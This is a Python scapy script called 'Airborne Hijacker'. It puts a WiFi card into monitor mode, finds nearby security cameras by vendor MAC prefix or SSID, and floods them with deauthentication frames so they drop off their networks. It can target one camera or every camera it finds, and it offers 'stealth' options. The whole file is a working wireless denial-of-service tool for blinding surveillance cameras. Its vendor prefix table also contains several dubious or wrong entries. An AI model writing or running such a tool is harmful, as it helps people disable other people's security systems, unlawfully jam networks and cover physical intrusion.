#!/usr/bin/env python3
"""
AIRBORNE HIJACKER vplus - Advanced WiFi Camera Detection & Isolation
Enhanced with stealth techniques and broader device support
"""

import os
import sys
import time
import threading
import json
import hashlib
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import *

# ==================== CONFIG ====================
# Extended OUI database for camera manufacturers
CAMERA_MAC_PREFIXES = {
    # Major camera manufacturers
    "24:0a:c4": "Hikvision",
    "30:ae:a4": "Dahua",
    "bc:dd:c2": "TP-Link",
    "a4:14:37": "Axis",
    "00:1a:3f": "Sony",
    "00:0e:8f": "Panasonic",
    "00:18:4a": "Samsung",
    "00:1c:f0": "Bosch",
    "00:1d:aa": "Vivotek",
    "00:22:75": "Arecont",
    "00:24:1d": "Mobotix",
    "00:26:22": "ACTi",
    "00:30:48": "GE Security",
    "00:40:8c": "Intelbras",
    "00:50:c2": "GE",
    "00:80:9f": "NEC",
    "00:90:a2": "Avaya",
    "00:a0:cd": "Avaya",
    "00:b0:d0": "Cisco",
    "00:c0:95": "3Com",
    "00:d0:ba": "Lucent",
    "00:e0:18": "D-Link",
    "00:e0:4c": "LevelOne",
    "00:e0:60": "Asus",
    "00:e0:91": "Netgear",
    "00:e0:98": "Belkin",
    "00:e0:a6": "SMC",
    "00:e0:b8": "Edimax",
    "00:e0:c0": "Siemens",
    "00:e0:f0": "Zyxel",
}

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== LOGGER ====================
class Logger:
    def __init__(self, log_file="argus_eye.log"):
        self.log_file = log_file
        
    def log(self, event_type, message, data=None):
        timestamp = datetime.now().isoformat()
        entry = {
            'timestamp': timestamp,
            'type': event_type,
            'message': message,
            'data': data
        }
        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')

# ==================== AIRBORNE HIJACKER ====================
class AirborneHijacker:
    """Advanced WiFi camera detection and isolation engine"""
    
    def __init__(self, interface="wlan0", stealth_mode=True):
        self.interface = interface
        self.stealth_mode = stealth_mode
        self.detected_cameras = {}
        self.sniffing = True
        self.logger = Logger()
        self.stop_event = threading.Event()
        self.channel_lock = threading.Lock()
        
        # Stats
        self.stats = {
            'packets_captured': 0,
            'cameras_detected': 0,
            'deauth_sent': 0,
            'start_time': time.time()
        }
        
        self._init_interface()
    
    def _init_interface(self):
        """Initialize wireless interface in monitor mode"""
        try:
            os.system(f"ip link set {self.interface} down")
            os.system(f"iw dev {self.interface} set type monitor")
            os.system(f"ip link set {self.interface} up")
            
            # Stealth: lower TX power if enabled
            if self.stealth_mode:
                os.system(f"iw dev {self.interface} set txpower fixed 5")
                cprint("[*] Stealth mode: TX power reduced", Colors.DIM)
            else:
                os.system(f"iw dev {self.interface} set txpower fixed 3000")
                cprint("[*] High power mode: TX power maxed", Colors.DIM)
                
            cprint("[+] Interface ready", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Interface init failed: {e}", Colors.RED)
            sys.exit(1)
    
    def channel_hopper(self):
        """Dynamic channel hopping with stealth"""
        channels = list(range(1, 14))  # 2.4GHz channels
        
        if self.stealth_mode:
            # Randomize channel order for stealth
            import random
            random.shuffle(channels)
        
        while self.sniffing and not self.stop_event.is_set():
            for channel in channels:
                if self.stop_event.is_set():
                    break
                with self.channel_lock:
                    os.system(f"iw dev {self.interface} set channel {channel}")
                    if self.stats['packets_captured'] % 100 == 0:
                        cprint(f"[*] Hopping to channel {channel}", Colors.DIM)
                time.sleep(0.3 if self.stealth_mode else 0.5)
    
    def packet_handler(self, pkt):
        """Passive sniffing callback"""
        self.stats['packets_captured'] += 1
        
        if pkt.haslayer(Dot11):
            src = pkt.addr2
            dst = pkt.addr1
            bssid = pkt.addr3
            
            if src:
                # Check MAC prefix
                prefix = src[:8].lower()
                
                # Check exact match and partial match
                if prefix in CAMERA_MAC_PREFIXES:
                    manufacturer = CAMERA_MAC_PREFIXES[prefix]
                    if src not in self.detected_cameras:
                        self.detected_cameras[src] = {
                            'bssid': bssid,
                            'manufacturer': manufacturer,
                            'first_seen': time.time(),
                            'channel': self._get_current_channel(),
                            'signal_strength': self._get_signal(pkt)
                        }
                        self.stats['cameras_detected'] += 1
                        
                        cprint(f"[+] CAMERA DETECTED: {src} ({manufacturer})", Colors.GREEN)
                        cprint(f"    BSSID: {bssid} | Channel: {self._get_current_channel()}", Colors.DIM)
                        
                        self.logger.log(
                            'camera_detected',
                            f"Camera detected: {src}",
                            self.detected_cameras[src]
                        )
                
                # Also detect via beacon frames (for hidden cameras)
                if pkt.haslayer(Dot11Beacon):
                    ssid = pkt.info.decode('utf-8', errors='ignore') if pkt.info else "Hidden"
                    if 'camera' in ssid.lower() or 'ipcam' in ssid.lower():
                        if src not in self.detected_cameras:
                            self.detected_cameras[src] = {
                                'bssid': bssid,
                                'manufacturer': 'Unknown (SSID Match)',
                                'first_seen': time.time(),
                                'channel': self._get_current_channel(),
                                'ssid': ssid
                            }
                            cprint(f"[+] CAMERA DETECTED (SSID): {src} - {ssid}", Colors.GREEN)
    
    def _get_current_channel(self):
        """Get current channel from interface"""
        try:
            result = os.popen(f"iw dev {self.interface} info | grep channel").read()
            if result:
                return int(result.split()[-1])
        except:
            pass
        return 0
    
    def _get_signal(self, pkt):
        """Extract signal strength from packet"""
        if hasattr(pkt, 'dBm_AntSignal'):
            return pkt.dBm_AntSignal
        return 0
    
    def scan_airspace(self, timeout=30):
        """Scan airspace for cameras"""
        cprint(f"\n[*] Scanning airspace for {timeout}s...", Colors.YELLOW)
        cprint("[*] Channels: 1-13 (2.4GHz)", Colors.DIM)
        
        if self.stealth_mode:
            cprint("[*] Stealth mode: passive listening only", Colors.DIM)
        
        # Start channel hopping
        hop_thread = threading.Thread(target=self.channel_hopper, daemon=True)
        hop_thread.start()
        
        # Sniff packets
        sniff(iface=self.interface, prn=self.packet_handler, timeout=timeout, store=0)
        
        # Stop hopping
        self.sniffing = False
        self.stop_event.set()
        
        cprint(f"\n[!] Scan complete. Found {len(self.detected_cameras)} cameras", Colors.GREEN)
        return self.detected_cameras
    
    def deauth_attack(self, target_mac, bssid, duration=10, intensity='medium'):
        """Deauth attack with configurable intensity"""
        if self.stealth_mode:
            cprint(f"[*] Stealth deauth: low intensity (targeted)", Colors.YELLOW)
            count = 50
            interval = 0.05
        else:
            intensity_map = {
                'low': (30, 0.1),
                'medium': (100, 0.01),
                'high': (200, 0.001)
            }
            count, interval = intensity_map.get(intensity, (100, 0.01))
        
        cprint(f"[*] Deauth attack on {target_mac} (duration: {duration}s)", Colors.RED)
        
        # Create deauth packets
        pkt1 = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Deauth(reason=7)
        
        end_time = time.time() + duration
        sent_count = 0
        
        while time.time() < end_time:
            sendp(pkt1, iface=self.interface, verbose=False, count=count, inter=interval)
            sendp(pkt2, iface=self.interface, verbose=False, count=count, inter=interval)
            sent_count += count * 2
            self.stats['deauth_sent'] += sent_count
            
            if sent_count % 500 == 0:
                cprint(f"[*] Deauth packets sent: {sent_count}", Colors.DIM)
            
            time.sleep(0.1)
        
        cprint(f"[+] Deauth complete: {sent_count} packets sent", Colors.GREEN)
        
        self.logger.log(
            'deauth_attack',
            f"Deauth attack on {target_mac}",
            {'bssid': bssid, 'packets': sent_count, 'duration': duration}
        )
    
    def isolate_camera(self, camera_mac, duration=15):
        """Isolate a specific camera"""
        if camera_mac not in self.detected_cameras:
            cprint(f"[-] Camera {camera_mac} not found", Colors.RED)
            return False
        
        cam_info = self.detected_cameras[camera_mac]
        bssid = cam_info.get('bssid')
        
        if not bssid:
            cprint(f"[-] No BSSID found for {camera_mac}", Colors.RED)
            return False
        
        cprint(f"\n[!] Isolating camera: {camera_mac}", Colors.RED, bold=True)
        cprint(f"    Manufacturer: {cam_info.get('manufacturer', 'Unknown')}", Colors.DIM)
        
        # Lock channel
        channel = cam_info.get('channel', 6)
        os.system(f"iw dev {self.interface} set channel {channel}")
        
        # Execute deauth
        self.deauth_attack(camera_mac, bssid, duration=duration)
        
        return True
    
    def isolate_all_cameras(self, duration=10):
        """Isolate all detected cameras"""
        if not self.detected_cameras:
            cprint("[!] No cameras detected", Colors.YELLOW)
            return
        
        cprint(f"\n[!] Isolating {len(self.detected_cameras)} cameras...", Colors.RED, bold=True)
        
        for cam_mac, cam_info in self.detected_cameras.items():
            bssid = cam_info.get('bssid')
            if bssid:
                cprint(f"[*] Isolating {cam_mac}", Colors.YELLOW)
                self.isolate_camera(cam_mac, duration)
                time.sleep(1)  # Cooldown between attacks
    
    def get_summary(self):
        """Get scan summary"""
        summary = {
            'total_cameras': len(self.detected_cameras),
            'stats': self.stats,
            'uptime': time.time() - self.stats['start_time'],
            'cameras': self.detected_cameras
        }
        return summary
    
    def export_results(self, filename="camera_scan.json"):
        """Export results to JSON"""
        data = self.get_summary()
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        cprint(f"[+] Results exported to {filename}", Colors.GREEN)

# ==================== MAIN ====================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Airborne Hijacker v2.0")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface")
    parser.add_argument("-s", "--stealth", action="store_true", help="Stealth mode")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Scan timeout")
    parser.add_argument("-d", "--duration", type=int, default=15, help="Deauth duration")
    parser.add_argument("-a", "--attack-all", action="store_true", help="Attack all cameras")
    parser.add_argument("target", nargs="?", help="Target MAC address")
    
    args = parser.parse_args()
    
    hijacker = AirborneHijacker(args.interface, args.stealth)
    
    try:
        # Scan
        hijacker.scan_airspace(timeout=args.timeout)
        
        if args.attack_all:
            hijacker.isolate_all_cameras(duration=args.duration)
        elif args.target:
            hijacker.isolate_camera(args.target, duration=args.duration)
        
        # Export results
        hijacker.export_results()
        
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted by user", Colors.RED)
    
    cprint("\n[+] Airborne Hijacker finished", Colors.GREEN)
